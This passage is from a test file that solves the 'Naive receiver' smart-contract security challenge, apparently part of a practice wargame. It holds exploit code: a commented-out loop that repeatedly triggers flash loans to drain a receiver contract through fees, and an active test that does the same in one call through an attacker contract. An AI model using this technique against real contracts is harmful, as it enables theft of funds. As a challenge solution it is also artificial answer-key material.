...
const DrainReceiverAttacker = contract.fromArtifact("DrainReceiverAttacker");
...
describe("[Challenge] Naive receiver", function () {
  ...
  // Recursive method, not efficient as ths creates 10 seperate transactions
  //   it("Exploit", async function () {
  //     /** YOUR EXPLOIT GOES HERE */
  //     while ((await web3.eth.getBalance(this.receiver.address)) > 0) {
  //       await this.pool.flashLoan(this.receiver.address, 9);
  //     }
  //   });

  it("ExploitWithOneFunctionCall", async function () {
    /** YOUR EXPLOIT GOES HERE */
    this.drainReceiverAttacker = await DrainReceiverAttacker.new(
      this.pool.address,
      { from: attacker }
    );

    await this.drainReceiverAttacker.drainReceiver(this.receiver.address, 0);
  });
